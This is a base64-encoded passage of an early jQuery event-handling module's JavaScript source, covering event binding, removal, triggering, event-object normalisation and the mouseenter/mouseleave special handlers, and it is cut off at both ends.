cGFnZSBoYXMgdW5sb2FkZWQKCQkJCWlmICggdHlwZW9mIGpRdWVyeSA9PSAidW5kZWZpbmVkIiB8fCBqUXVlcnkuZXZlbnQudHJpZ2dlcmVkICkKCQkJCQlyZXR1cm4gdmFsOwoJCQoJCQkJdmFsID0galF1ZXJ5LmV2ZW50LmhhbmRsZS5hcHBseShhcmd1bWVudHMuY2FsbGVlLmVsZW0sIGFyZ3VtZW50cyk7CgkJCgkJCQlyZXR1cm4gdmFsOwoJCQl9KTsKCQkvLyBBZGQgZWxlbSBhcyBhIHByb3BlcnR5IG9mIHRoZSBoYW5kbGUgZnVuY3Rpb24KCQkvLyBUaGlzIGlzIHRvIHByZXZlbnQgYSBtZW1vcnkgbGVhayB3aXRoIG5vbi1uYXRpdmUKCQkvLyBldmVudCBpbiBJRS4KCQloYW5kbGUuZWxlbSA9IGVsZW07CgkJCQoJCQkvLyBIYW5kbGUgbXVsdGlwbGUgZXZlbnRzIHNlcGVyYXRlZCBieSBhIHNwYWNlCgkJCS8vIGpRdWVyeSguLi4pLmJpbmQoIm1vdXNlb3ZlciBtb3VzZW91dCIsIGZuKTsKCQkJalF1ZXJ5LmVhY2godHlwZXMuc3BsaXQoL1xzKy8pLCBmdW5jdGlvbihpbmRleCwgdHlwZSkgewoJCQkJLy8gTmFtZXNwYWNlZCBldmVudCBoYW5kbGVycwoJCQkJdmFyIHBhcnRzID0gdHlwZS5zcGxpdCgiLiIpOwoJCQkJdHlwZSA9IHBhcnRzWzBdOwoJCQkJaGFuZGxlci50eXBlID0gcGFydHNbMV07CgoJCQkJLy8gR2V0IHRoZSBjdXJyZW50IGxpc3Qgb2YgZnVuY3Rpb25zIGJvdW5kIHRvIHRoaXMgZXZlbnQKCQkJCXZhciBoYW5kbGVycyA9IGV2ZW50c1t0eXBlXTsKCgkJCQkvLyBJbml0IHRoZSBldmVudCBoYW5kbGVyIHF1ZXVlCgkJCQlpZiAoIWhhbmRsZXJzKSB7CgkJCQkJaGFuZGxlcnMgPSBldmVudHNbdHlwZV0gPSB7fTsKCQkKCQkJCQkvLyBDaGVjayBmb3IgYSBzcGVjaWFsIGV2ZW50IGhhbmRsZXIKCQkJCQkvLyBPbmx5IHVzZSBhZGRFdmVudExpc3RlbmVyL2F0dGFjaEV2ZW50IGlmIHRoZSBzcGVjaWFsCgkJCQkJLy8gZXZlbnRzIGhhbmRsZXIgcmV0dXJucyBmYWxzZQoJCQkJCWlmICggIWpRdWVyeS5ldmVudC5zcGVjaWFsW3R5cGVdIHx8IGpRdWVyeS5ldmVudC5zcGVjaWFsW3R5cGVdLnNldHVwLmNhbGwoZWxlbSkgPT09IGZhbHNlICkgewoJCQkJCQkvLyBCaW5kIHRoZSBnbG9iYWwgZXZlbnQgaGFuZGxlciB0byB0aGUgZWxlbWVudAoJCQkJCQlpZiAoZWxlbS5hZGRFdmVudExpc3RlbmVyKQoJCQkJCQkJZWxlbS5hZGRFdmVudExpc3RlbmVyKHR5cGUsIGhhbmRsZSwgZmFsc2UpOwoJCQkJCQllbHNlIGlmIChlbGVtLmF0dGFjaEV2ZW50KQoJCQkJCQkJZWxlbS5hdHRhY2hFdmVudCgib24iICsgdHlwZSwgaGFuZGxlKTsKCQkJCQl9CgkJCQl9CgoJCQkJLy8gQWRkIHRoZSBmdW5jdGlvbiB0byB0aGUgZWxlbWVudCdzIGhhbmRsZXIgbGlzdAoJCQkJaGFuZGxlcnNbaGFuZGxlci5ndWlkXSA9IGhhbmRsZXI7CgoJCQkJLy8gS2VlcCB0cmFjayBvZiB3aGljaCBldmVudHMgaGF2ZSBiZWVuIHVzZWQsIGZvciBnbG9iYWwgdHJpZ2dlcmluZwoJCQkJalF1ZXJ5LmV2ZW50Lmdsb2JhbFt0eXBlXSA9IHRydWU7CgkJCX0pOwoJCQoJCS8vIE51bGxpZnkgZWxlbSB0byBwcmV2ZW50IG1lbW9yeSBsZWFrcyBpbiBJRQoJCWVsZW0gPSBudWxsOwoJfSwKCglndWlkOiAxLAoJZ2xvYmFsOiB7fSwKCgkvLyBEZXRhY2ggYW4gZXZlbnQgb3Igc2V0IG9mIGV2ZW50cyBmcm9tIGFuIGVsZW1lbnQKCXJlbW92ZTogZnVuY3Rpb24oZWxlbSwgdHlwZXMsIGhhbmRsZXIpIHsKCQkvLyBkb24ndCBkbyBldmVudHMgb24gdGV4dCBhbmQgY29tbWVudCBub2RlcwoJCWlmICggZWxlbS5ub2RlVHlwZSA9PSAzIHx8IGVsZW0ubm9kZVR5cGUgPT0gOCApCgkJCXJldHVybjsKCgkJdmFyIGV2ZW50cyA9IGpRdWVyeS5kYXRhKGVsZW0sICJldmVudHMiKSwgcmV0LCBpbmRleDsKCgkJaWYgKCBldmVudHMgKSB7CgkJCS8vIFVuYmluZCBhbGwgZXZlbnRzIGZvciB0aGUgZWxlbWVudAoJCQlpZiAoIHR5cGVzID09IHVuZGVmaW5lZCApCgkJCQlmb3IgKCB2YXIgdHlwZSBpbiBldmVudHMgKQoJCQkJCXRoaXMucmVtb3ZlKCBlbGVtLCB0eXBlICk7CgkJCWVsc2UgewoJCQkJLy8gdHlwZXMgaXMgYWN0dWFsbHkgYW4gZXZlbnQgb2JqZWN0IGhlcmUKCQkJCWlmICggdHlwZXMudHlwZSApIHsKCQkJCQloYW5kbGVyID0gdHlwZXMuaGFuZGxlcjsKCQkJCQl0eXBlcyA9IHR5cGVzLnR5cGU7CgkJCQl9CgkJCQkKCQkJCS8vIEhhbmRsZSBtdWx0aXBsZSBldmVudHMgc2VwZXJhdGVkIGJ5IGEgc3BhY2UKCQkJCS8vIGpRdWVyeSguLi4pLnVuYmluZCgibW91c2VvdmVyIG1vdXNlb3V0IiwgZm4pOwoJCQkJalF1ZXJ5LmVhY2godHlwZXMuc3BsaXQoL1xzKy8pLCBmdW5jdGlvbihpbmRleCwgdHlwZSl7CgkJCQkJLy8gTmFtZXNwYWNlZCBldmVudCBoYW5kbGVycwoJCQkJCXZhciBwYXJ0cyA9IHR5cGUuc3BsaXQoIi4iKTsKCQkJCQl0eXBlID0gcGFydHNbMF07CgkJCQkJCgkJCQkJaWYgKCBldmVudHNbdHlwZV0gKSB7CgkJCQkJCS8vIHJlbW92ZSB0aGUgZ2l2ZW4gaGFuZGxlciBmb3IgdGhlIGdpdmVuIHR5cGUKCQkJCQkJaWYgKCBoYW5kbGVyICkKCQkJCQkJCWRlbGV0ZSBldmVudHNbdHlwZV1baGFuZGxlci5ndWlkXTsKCQkJCgkJCQkJCS8vIHJlbW92ZSBhbGwgaGFuZGxlcnMgZm9yIHRoZSBnaXZlbiB0eXBlCgkJCQkJCWVsc2UKCQkJCQkJCWZvciAoIGhhbmRsZXIgaW4gZXZlbnRzW3R5cGVdICkKCQkJCQkJCQkvLyBIYW5kbGUgdGhlIHJlbW92YWwgb2YgbmFtZXNwYWNlZCBldmVudHMKCQkJCQkJCQlpZiAoICFwYXJ0c1sxXSB8fCBldmVudHNbdHlwZV1baGFuZGxlcl0udHlwZSA9PSBwYXJ0c1sxXSApCgkJCQkJCQkJCWRlbGV0ZSBldmVudHNbdHlwZV1baGFuZGxlcl07CgoJCQkJCQkvLyByZW1vdmUgZ2VuZXJpYyBldmVudCBoYW5kbGVyIGlmIG5vIG1vcmUgaGFuZGxlcnMgZXhpc3QKCQkJCQkJZm9yICggcmV0IGluIGV2ZW50c1t0eXBlXSApIGJyZWFrOwoJCQkJCQlpZiAoICFyZXQgKSB7CgkJCQkJCQlpZiAoICFqUXVlcnkuZXZlbnQuc3BlY2lhbFt0eXBlXSB8fCBqUXVlcnkuZXZlbnQuc3BlY2lhbFt0eXBlXS50ZWFyZG93bi5jYWxsKGVsZW0pID09PSBmYWxzZSApIHsKCQkJCQkJCQlpZiAoZWxlbS5yZW1vdmVFdmVudExpc3RlbmVyKQoJCQkJCQkJCQllbGVtLnJlbW92ZUV2ZW50TGlzdGVuZXIodHlwZSwgalF1ZXJ5LmRhdGEoZWxlbSwgImhhbmRsZSIpLCBmYWxzZSk7CgkJCQkJCQkJZWxzZSBpZiAoZWxlbS5kZXRhY2hFdmVudCkKCQkJCQkJCQkJZWxlbS5kZXRhY2hFdmVudCgib24iICsgdHlwZSwgalF1ZXJ5LmRhdGEoZWxlbSwgImhhbmRsZSIpKTsKCQkJCQkJCX0KCQkJCQkJCXJldCA9IG51bGw7CgkJCQkJCQlkZWxldGUgZXZlbnRzW3R5cGVdOwoJCQkJCQl9CgkJCQkJfQoJCQkJfSk7CgkJCX0KCgkJCS8vIFJlbW92ZSB0aGUgZXhwYW5kbyBpZiBpdCdzIG5vIGxvbmdlciB1c2VkCgkJCWZvciAoIHJldCBpbiBldmVudHMgKSBicmVhazsKCQkJaWYgKCAhcmV0ICkgewoJCQkJdmFyIGhhbmRsZSA9IGpRdWVyeS5kYXRhKCBlbGVtLCAiaGFuZGxlIiApOwoJCQkJaWYgKCBoYW5kbGUgKSBoYW5kbGUuZWxlbSA9IG51bGw7CgkJCQlqUXVlcnkucmVtb3ZlRGF0YSggZWxlbSwgImV2ZW50cyIgKTsKCQkJCWpRdWVyeS5yZW1vdmVEYXRhKCBlbGVtLCAiaGFuZGxlIiApOwoJCQl9CgkJfQoJfSwKCgl0cmlnZ2VyOiBmdW5jdGlvbih0eXBlLCBkYXRhLCBlbGVtLCBkb25hdGl2ZSwgZXh0cmEpIHsKCQkvLyBDbG9uZSB0aGUgaW5jb21pbmcgZGF0YSwgaWYgYW55CgkJZGF0YSA9IGpRdWVyeS5tYWtlQXJyYXkoZGF0YSB8fCBbXSk7CgoJCS8vIEhhbmRsZSBhIGdsb2JhbCB0cmlnZ2VyCgkJaWYgKCAhZWxlbSApIHsKCQkJLy8gT25seSB0cmlnZ2VyIGlmIHdlJ3ZlIGV2ZXIgYm91bmQgYW4gZXZlbnQgZm9yIGl0CgkJCWlmICggdGhpcy5nbG9iYWxbdHlwZV0gKQoJCQkJalF1ZXJ5KCIqIikuYWRkKFt3aW5kb3csIGRvY3VtZW50XSkudHJpZ2dlcih0eXBlLCBkYXRhKTsKCgkJLy8gSGFuZGxlIHRyaWdnZXJpbmcgYSBzaW5nbGUgZWxlbWVudAoJCX0gZWxzZSB7CgkJCS8vIGRvbid0IGRvIGV2ZW50cyBvbiB0ZXh0IGFuZCBjb21tZW50IG5vZGVzCgkJCWlmICggZWxlbS5ub2RlVHlwZSA9PSAzIHx8IGVsZW0ubm9kZVR5cGUgPT0gOCApCgkJCQlyZXR1cm4gdW5kZWZpbmVkOwoKCQkJdmFyIHZhbCwgcmV0LCBmbiA9IGpRdWVyeS5pc0Z1bmN0aW9uKCBlbGVtWyB0eXBlIF0gfHwgbnVsbCApLAoJCQkJLy8gQ2hlY2sgdG8gc2VlIGlmIHdlIG5lZWQgdG8gcHJvdmlkZSBhIGZha2UgZXZlbnQsIG9yIG5vdAoJCQkJZXZlbnQgPSAhZGF0YVswXSB8fCAhZGF0YVswXS5wcmV2ZW50RGVmYXVsdDsKCQkJCgkJCS8vIFBhc3MgYWxvbmcgYSBmYWtlIGV2ZW50CgkJCWlmICggZXZlbnQgKQoJCQkJZGF0YS51bnNoaWZ0KCB0aGlzLmZpeCh7IHR5cGU6IHR5cGUsIHRhcmdldDogZWxlbSB9KSApOwoKCQkJLy8gRW5mb3JjZSB0aGUgcmlnaHQgdHJpZ2dlciB0eXBlCgkJCWRhdGFbMF0udHlwZSA9IHR5cGU7CgoJCQkvLyBUcmlnZ2VyIHRoZSBldmVudAoJCQlpZiAoIGpRdWVyeS5pc0Z1bmN0aW9uKCBqUXVlcnkuZGF0YShlbGVtLCAiaGFuZGxlIikgKSApCgkJCQl2YWwgPSBqUXVlcnkuZGF0YShlbGVtLCAiaGFuZGxlIikuYXBwbHkoIGVsZW0sIGRhdGEgKTsKCgkJCS8vIEhhbmRsZSB0cmlnZ2VyaW5nIG5hdGl2ZSAub25mb28gaGFuZGxlcnMKCQkJaWYgKCAhZm4gJiYgZWxlbVsib24iK3R5cGVdICYmIGVsZW1bIm9uIit0eXBlXS5hcHBseSggZWxlbSwgZGF0YSApID09PSBmYWxzZSApCgkJCQl2YWwgPSBmYWxzZTsKCgkJCS8vIEV4dHJhIGZ1bmN0aW9ucyBkb24ndCBnZXQgdGhlIGN1c3RvbSBldmVudCBvYmplY3QKCQkJaWYgKCBldmVudCApCgkJCQlkYXRhLnNoaWZ0KCk7CgoJCQkvLyBIYW5kbGUgdHJpZ2dlcmluZyBvZiBleHRyYSBmdW5jdGlvbgoJCQlpZiAoIGV4dHJhICYmIGpRdWVyeS5pc0Z1bmN0aW9uKCBleHRyYSApICkgewoJCQkJLy8gY2FsbCB0aGUgZXh0cmEgZnVuY3Rpb24gYW5kIHRhY2sgdGhlIGN1cnJlbnQgcmV0dXJuIHZhbHVlIG9uIHRoZSBlbmQgZm9yIHBvc3NpYmxlIGluc3BlY3Rpb24KCQkJCXJldCA9IGV4dHJhLmFwcGx5KCBlbGVtLCB2YWwgPT0gbnVsbCA/IGRhdGEgOiBkYXRhLmNvbmNhdCggdmFsICkgKTsKCQkJCS8vIGlmIGFueXRoaW5nIGlzIHJldHVybmVkLCBnaXZlIGl0IHByZWNlZGVuY2UgYW5kIGhhdmUgaXQgb3ZlcndyaXRlIHRoZSBwcmV2aW91cyB2YWx1ZQoJCQkJaWYgKHJldCAhPT0gdW5kZWZpbmVkKQoJCQkJCXZhbCA9IHJldDsKCQkJfQoKCQkJLy8gVHJpZ2dlciB0aGUgbmF0aXZlIGV2ZW50cyAoZXhjZXB0IGZvciBjbGlja3Mgb24gbGlua3MpCgkJCWlmICggZm4gJiYgZG9uYXRpdmUgIT09IGZhbHNlICYmIHZhbCAhPT0gZmFsc2UgJiYgIShqUXVlcnkubm9kZU5hbWUoZWxlbSwgJ2EnKSAmJiB0eXBlID09ICJjbGljayIpICkgewoJCQkJdGhpcy50cmlnZ2VyZWQgPSB0cnVlOwoJCQkJdHJ5IHsKCQkJCQllbGVtWyB0eXBlIF0oKTsKCQkJCS8vIHByZXZlbnQgSUUgZnJvbSB0aHJvd2luZyBhbiBlcnJvciBmb3Igc29tZSBoaWRkZW4gZWxlbWVudHMKCQkJCX0gY2F0Y2ggKGUpIHt9CgkJCX0KCgkJCXRoaXMudHJpZ2dlcmVkID0gZmFsc2U7CgkJfQoKCQlyZXR1cm4gdmFsOwoJfSwKCgloYW5kbGU6IGZ1bmN0aW9uKGV2ZW50KSB7CgkJLy8gcmV0dXJuZWQgdW5kZWZpbmVkIG9yIGZhbHNlCgkJdmFyIHZhbDsKCgkJLy8gRW1wdHkgb2JqZWN0IGlzIGZvciB0cmlnZ2VyZWQgZXZlbnRzIHdpdGggbm8gZGF0YQoJCWV2ZW50ID0galF1ZXJ5LmV2ZW50LmZpeCggZXZlbnQgfHwgd2luZG93LmV2ZW50IHx8IHt9ICk7IAoKCQkvLyBOYW1lc3BhY2VkIGV2ZW50IGhhbmRsZXJzCgkJdmFyIHBhcnRzID0gZXZlbnQudHlwZS5zcGxpdCgiLiIpOwoJCWV2ZW50LnR5cGUgPSBwYXJ0c1swXTsKCgkJdmFyIGhhbmRsZXJzID0galF1ZXJ5LmRhdGEodGhpcywgImV2ZW50cyIpICYmIGpRdWVyeS5kYXRhKHRoaXMsICJldmVudHMiKVtldmVudC50eXBlXSwgYXJncyA9IEFycmF5LnByb3RvdHlwZS5zbGljZS5jYWxsKCBhcmd1bWVudHMsIDEgKTsKCQlhcmdzLnVuc2hpZnQoIGV2ZW50ICk7CgoJCWZvciAoIHZhciBqIGluIGhhbmRsZXJzICkgewoJCQl2YXIgaGFuZGxlciA9IGhhbmRsZXJzW2pdOwoJCQkvLyBQYXNzIGluIGEgcmVmZXJlbmNlIHRvIHRoZSBoYW5kbGVyIGZ1bmN0aW9uIGl0c2VsZgoJCQkvLyBTbyB0aGF0IHdlIGNhbiBsYXRlciByZW1vdmUgaXQKCQkJYXJnc1swXS5oYW5kbGVyID0gaGFuZGxlcjsKCQkJYXJnc1swXS5kYXRhID0gaGFuZGxlci5kYXRhOwoKCQkJLy8gRmlsdGVyIHRoZSBmdW5jdGlvbnMgYnkgY2xhc3MKCQkJaWYgKCAhcGFydHNbMV0gfHwgaGFuZGxlci50eXBlID09IHBhcnRzWzFdICkgewoJCQkJdmFyIHJldCA9IGhhbmRsZXIuYXBwbHkoIHRoaXMsIGFyZ3MgKTsKCgkJCQlpZiAoIHZhbCAhPT0gZmFsc2UgKQoJCQkJCXZhbCA9IHJldDsKCgkJCQlpZiAoIHJldCA9PT0gZmFsc2UgKSB7CgkJCQkJZXZlbnQucHJldmVudERlZmF1bHQoKTsKCQkJCQlldmVudC5zdG9wUHJvcGFnYXRpb24oKTsKCQkJCX0KCQkJfQoJCX0KCgkJLy8gQ2xlYW4gdXAgYWRkZWQgcHJvcGVydGllcyBpbiBJRSB0byBwcmV2ZW50IG1lbW9yeSBsZWFrCgkJaWYgKGpRdWVyeS5icm93c2VyLm1zaWUpCgkJCWV2ZW50LnRhcmdldCA9IGV2ZW50LnByZXZlbnREZWZhdWx0ID0gZXZlbnQuc3RvcFByb3BhZ2F0aW9uID0KCQkJCWV2ZW50LmhhbmRsZXIgPSBldmVudC5kYXRhID0gbnVsbDsKCgkJcmV0dXJuIHZhbDsKCX0sCgoJZml4OiBmdW5jdGlvbihldmVudCkgewoJCS8vIHN0b3JlIGEgY29weSBvZiB0aGUgb3JpZ2luYWwgZXZlbnQgb2JqZWN0IAoJCS8vIGFuZCBjbG9uZSB0byBzZXQgcmVhZC1vbmx5IHByb3BlcnRpZXMKCQl2YXIgb3JpZ2luYWxFdmVudCA9IGV2ZW50OwoJCWV2ZW50ID0galF1ZXJ5LmV4dGVuZCh7fSwgb3JpZ2luYWxFdmVudCk7CgkJCgkJLy8gYWRkIHByZXZlbnREZWZhdWx0IGFuZCBzdG9wUHJvcGFnYXRpb24gc2luY2UgCgkJLy8gdGhleSB3aWxsIG5vdCB3b3JrIG9uIHRoZSBjbG9uZQoJCWV2ZW50LnByZXZlbnREZWZhdWx0ID0gZnVuY3Rpb24oKSB7CgkJCS8vIGlmIHByZXZlbnREZWZhdWx0IGV4aXN0cyBydW4gaXQgb24gdGhlIG9yaWdpbmFsIGV2ZW50CgkJCWlmIChvcmlnaW5hbEV2ZW50LnByZXZlbnREZWZhdWx0KQoJCQkJb3JpZ2luYWxFdmVudC5wcmV2ZW50RGVmYXVsdCgpOwoJCQkvLyBvdGhlcndpc2Ugc2V0IHRoZSByZXR1cm5WYWx1ZSBwcm9wZXJ0eSBvZiB0aGUgb3JpZ2luYWwgZXZlbnQgdG8gZmFsc2UgKElFKQoJCQlvcmlnaW5hbEV2ZW50LnJldHVyblZhbHVlID0gZmFsc2U7CgkJfTsKCQlldmVudC5zdG9wUHJvcGFnYXRpb24gPSBmdW5jdGlvbigpIHsKCQkJLy8gaWYgc3RvcFByb3BhZ2F0aW9uIGV4aXN0cyBydW4gaXQgb24gdGhlIG9yaWdpbmFsIGV2ZW50CgkJCWlmIChvcmlnaW5hbEV2ZW50LnN0b3BQcm9wYWdhdGlvbikKCQkJCW9yaWdpbmFsRXZlbnQuc3RvcFByb3BhZ2F0aW9uKCk7CgkJCS8vIG90aGVyd2lzZSBzZXQgdGhlIGNhbmNlbEJ1YmJsZSBwcm9wZXJ0eSBvZiB0aGUgb3JpZ2luYWwgZXZlbnQgdG8gdHJ1ZSAoSUUpCgkJCW9yaWdpbmFsRXZlbnQuY2FuY2VsQnViYmxlID0gdHJ1ZTsKCQl9OwoJCQoJCS8vIEZpeCB0YXJnZXQgcHJvcGVydHksIGlmIG5lY2Vzc2FyeQoJCWlmICggIWV2ZW50LnRhcmdldCApCgkJCWV2ZW50LnRhcmdldCA9IGV2ZW50LnNyY0VsZW1lbnQgfHwgZG9jdW1lbnQ7IC8vIEZpeGVzICMxOTI1IHdoZXJlIHNyY0VsZW1lbnQgbWlnaHQgbm90IGJlIGRlZmluZWQgZWl0aGVyCgkJCQkKCQkvLyBjaGVjayBpZiB0YXJnZXQgaXMgYSB0ZXh0bm9kZSAoc2FmYXJpKQoJCWlmICggZXZlbnQudGFyZ2V0Lm5vZGVUeXBlID09IDMgKQoJCQlldmVudC50YXJnZXQgPSBvcmlnaW5hbEV2ZW50LnRhcmdldC5wYXJlbnROb2RlOwoKCQkvLyBBZGQgcmVsYXRlZFRhcmdldCwgaWYgbmVjZXNzYXJ5CgkJaWYgKCAhZXZlbnQucmVsYXRlZFRhcmdldCAmJiBldmVudC5mcm9tRWxlbWVudCApCgkJCWV2ZW50LnJlbGF0ZWRUYXJnZXQgPSBldmVudC5mcm9tRWxlbWVudCA9PSBldmVudC50YXJnZXQgPyBldmVudC50b0VsZW1lbnQgOiBldmVudC5mcm9tRWxlbWVudDsKCgkJLy8gQ2FsY3VsYXRlIHBhZ2VYL1kgaWYgbWlzc2luZyBhbmQgY2xpZW50WC9ZIGF2YWlsYWJsZQoJCWlmICggZXZlbnQucGFnZVggPT0gbnVsbCAmJiBldmVudC5jbGllbnRYICE9IG51bGwgKSB7CgkJCXZhciBkb2MgPSBkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQsIGJvZHkgPSBkb2N1bWVudC5ib2R5OwoJCQlldmVudC5wYWdlWCA9IGV2ZW50LmNsaWVudFggKyAoZG9jICYmIGRvYy5zY3JvbGxMZWZ0IHx8IGJvZHkgJiYgYm9keS5zY3JvbGxMZWZ0IHx8IDApIC0gKGRvYy5jbGllbnRMZWZ0IHx8IDApOwoJCQlldmVudC5wYWdlWSA9IGV2ZW50LmNsaWVudFkgKyAoZG9jICYmIGRvYy5zY3JvbGxUb3AgfHwgYm9keSAmJiBib2R5LnNjcm9sbFRvcCB8fCAwKSAtIChkb2MuY2xpZW50VG9wIHx8IDApOwoJCX0KCQkJCgkJLy8gQWRkIHdoaWNoIGZvciBrZXkgZXZlbnRzCgkJaWYgKCAhZXZlbnQud2hpY2ggJiYgKChldmVudC5jaGFyQ29kZSB8fCBldmVudC5jaGFyQ29kZSA9PT0gMCkgPyBldmVudC5jaGFyQ29kZSA6IGV2ZW50LmtleUNvZGUpICkKCQkJZXZlbnQud2hpY2ggPSBldmVudC5jaGFyQ29kZSB8fCBldmVudC5rZXlDb2RlOwoJCQoJCS8vIEFkZCBtZXRhS2V5IHRvIG5vbi1NYWMgYnJvd3NlcnMgKHVzZSBjdHJsIGZvciBQQydzIGFuZCBNZXRhIGZvciBNYWNzKQoJCWlmICggIWV2ZW50Lm1ldGFLZXkgJiYgZXZlbnQuY3RybEtleSApCgkJCWV2ZW50Lm1ldGFLZXkgPSBldmVudC5jdHJsS2V5OwoKCQkvLyBBZGQgd2hpY2ggZm9yIGNsaWNrOiAxID09IGxlZnQ7IDIgPT0gbWlkZGxlOyAzID09IHJpZ2h0CgkJLy8gTm90ZTogYnV0dG9uIGlzIG5vdCBub3JtYWxpemVkLCBzbyBkb24ndCB1c2UgaXQKCQlpZiAoICFldmVudC53aGljaCAmJiBldmVudC5idXR0b24gKQoJCQlldmVudC53aGljaCA9IChldmVudC5idXR0b24gJiAxID8gMSA6ICggZXZlbnQuYnV0dG9uICYgMiA/IDMgOiAoIGV2ZW50LmJ1dHRvbiAmIDQgPyAyIDogMCApICkpOwoJCQkKCQlyZXR1cm4gZXZlbnQ7Cgl9LAoJCglzcGVjaWFsOiB7CgkJcmVhZHk6IHsKCQkJc2V0dXA6IGZ1bmN0aW9uKCkgewoJCQkJLy8gTWFrZSBzdXJlIHRoZSByZWFkeSBldmVudCBpcyBzZXR1cAoJCQkJYmluZFJlYWR5KCk7CgkJCQlyZXR1cm47CgkJCX0sCgkJCQoJCQl0ZWFyZG93bjogZnVuY3Rpb24oKSB7IHJldHVybjsgfQoJCX0sCgkJCgkJbW91c2VlbnRlcjogewoJCQlzZXR1cDogZnVuY3Rpb24oKSB7CgkJCQlpZiAoIGpRdWVyeS5icm93c2VyLm1zaWUgKSByZXR1cm4gZmFsc2U7CgkJCQlqUXVlcnkodGhpcykuYmluZCgibW91c2VvdmVyIiwgalF1ZXJ5LmV2ZW50LnNwZWNpYWwubW91c2VlbnRlci5oYW5kbGVyKTsKCQkJCXJldHVybiB0cnVlOwoJCQl9LAoJCQoJCQl0ZWFyZG93bjogZnVuY3Rpb24oKSB7CgkJCQlpZiAoIGpRdWVyeS5icm93c2VyLm1zaWUgKSByZXR1cm4gZmFsc2U7CgkJCQlqUXVlcnkodGhpcykudW5iaW5kKCJtb3VzZW92ZXIiLCBqUXVlcnkuZXZlbnQuc3BlY2lhbC5tb3VzZWVudGVyLmhhbmRsZXIpOwoJCQkJcmV0dXJuIHRydWU7CgkJCX0sCgkJCQoJCQloYW5kbGVyOiBmdW5jdGlvbihldmVudCkgewoJCQkJLy8gSWYgd2UgYWN0dWFsbHkganVzdCBtb3VzZWQgb24gdG8gYSBzdWItZWxlbWVudCwgaWdub3JlIGl0CgkJCQlpZiAoIHdpdGhpbkVsZW1lbnQoZXZlbnQsIHRoaXMpICkgcmV0dXJuIHRydWU7CgkJCQkvLyBFeGVjdXRlIHRoZSByaWdodCBoYW5kbGVycyBieSBzZXR0aW5nIHRoZSBldmVudCB0eXBlIHRvIG1vdXNlZW50ZXIKCQkJCWFyZ3VtZW50c1swXS50eXBlID0gIm1vdXNlZW50ZXIiOwoJCQkJcmV0dXJuIGpRdWVyeS5ldmVudC5oYW5kbGUuYXBwbHkodGhpcywgYXJndW1lbnRzKTsKCQkJfQoJCX0sCgkKCQltb3VzZWxlYXZlOiB7CgkJCXNldHVwOiBmdW5jdGlvbigpIHsKCQkJCWlmICggalF1ZXJ5LmJyb3dzZXIubXNpZSApIHJldHVybiBmYWxzZTsKCQkJCWpRdWVyeSh0aGlzKS5iaW5kKCJtb3VzZW91dCIsIGpRdWVyeS5ldmVudC5zcGVjaWFsLm1vdXNlbGVhdmUuaGFuZGxlcik7CgkJCQlyZXR1cm4gdHJ1ZTsKCQkJfSwKCQkKCQkJdGVhcmRvd246IGZ1bmN0aW9uKCkgewoJCQkJaWYgKCBqUXVlcnkuYnJvd3Nlci5tc2llICkgcmV0dXJuIGZhbHNlOwoJCQkJalF1ZXJ5KHRoaXMpLnVuYmluZCgibW91c2VvdXQiLCBqUXVlcnkuZXZlbnQuc3BlY2lhbC5tb3VzZWxlYXZlLmhhbmRsZXIpOwoJCQkJcmV0dXJuIHRydWU7CgkJCX0sCgkJCQoJCQloYW5kbGVyOiBmdW5jdGlvbihldmVudCkgewoJCQkJLy8gSWYgd2UgYWN0dWFsbHkganVzdCBtb3VzZWQgb24gdG8gYSBzdWItZWxlbWVudCwgaWdub3JlIGl0CgkJCQlpZiAoIHdpdGhpbkVsZW1lbnQoZXZlbnQsIHRoaXMpICkgcmV0dXJuIHRydWU7CgkJCQkvLyBFeGVjdXRlIHRoZSByaWdodCBoYW5kbGVycyBieSBzZXR0aW5nIHRoZSBldmVudCB0eXBlIHRvIG1vdXNlbGVhdmUKCQkJCWFyZ3VtZW50c1swXS50eXBlID0gIm1vdXNlbGVhdmUiOwoJCQkJcmV0dXJuIGpRdWVyeS5ldmVudC5oYW5kbGUuYXBwbHkodGhpcywgYXJndW1lbnRzKTsKCQkJfQoJCX0KCX0KfTsKCmpRdWVyeS5mbi5leHRlbmQoewoJYmluZDogZnVuY3Rpb24oIHR5cGUsIGRhdGEsIGZuICkgewoJCXJldHVybiB0eXBlID09ICJ1bmxvYWQiID8gdGhpcy5vbmUodHlwZSwgZGF0YSwgZm4pIDogdGhpcy5lYWNoKGZ1bmN0aW9uKCl7CgkJCWpRdWVyeS5ldmVudC5hZGQoIHRoaXMsIHR5cGUsIGZuIHx8IGRhdGEsIGZuICYmIGRhdGEgKTsKCQl9KTsKCX0sCgkKCW9uZTogZnVuY3Rpb24oIHR5cGUsIGRhdGEsIGZuICkgewoJCXJldHVybiB0aGlzLmVhY2goZnVuY3Rpb24oKXsKCQkJalF1ZXJ5LmV2ZW50LmFkZCggdGhpcywgdHlwZSwgZnVuY3Rpb24oZXZlbnQpIHsKCQkJCWpRdWVyeSh0aGlzKS51bmJpbmQoZXZlbnQpOwoJCQkJcmV0dXJuIChmbiB8fCBkYXRhKS5hcHBseSggdGhpcywgYXJndW1lbnRzKTsKCQkJfSwgZm4gJiYgZGF0YSk7CgkJfSk7Cgl9LAoKCXVuYmluZDogZnVuY3Rpb24oIHR5cGUsIGZuICkgewoJCXJldHVybiB0aGlzLmVhY2goZnVuY3Rpb24oKXsKCQkJalF1ZXJ5LmV2ZW50LnJlbW92ZSggdGhpcywgdHlwZSwgZm4gKTsKCQl9KTsKCX0sCgoJdHJpZ2dlcjogZnVuY3Rpb24oIHR5cGUsIGRhdGEsIGZuICkgewoJCXJldHVybiB0aGlzLmVhY2goZnVuY3Rpb24oKXsKCQkJalF1ZXJ5LmV2ZW50LnRyaWdnZXIoIHR5cGUsIGRhdGEsIHRoaXMsIHRydWUsIGZuICk7CgkJfSk7Cgl9LAoKCXRyaWdnZXJIYW5kbGVyOiBmdW5jdGlvbiggdHlwZSwgZGF0YSwgZm4gKSB7CgkJaWYgKCB0aGlzWzBdICkKCQkJcmV0dXJuIGpRdWVyeS5ldmVudC50cmlnZ2VyKCB0eXBlLCBkYXRhLCB0aGlzWzBdLCBmYWxzZSwgZm4gKTsKCQlyZXR1cm4gdW5kZWZpbmVkOwoJfSwKCgl0b2dnbGU6IGZ1bmN0aW9uKCkgewoJCS8vIFNhdmUgcmVmZXJlbmNlIHRvIGFyZ3VtZW50cyBmb3IgYWNjZXNzIGluIGNsb3N1cmUKCQl2YXIgYXJncyA9IGFyZ3VtZW50czsKCgkJcmV0dXJuIHRoaXMuY2xpY2soZnVuY3Rpb24oZXZlbnQpIHsKCQkJLy8gRmlndXJlIG91dC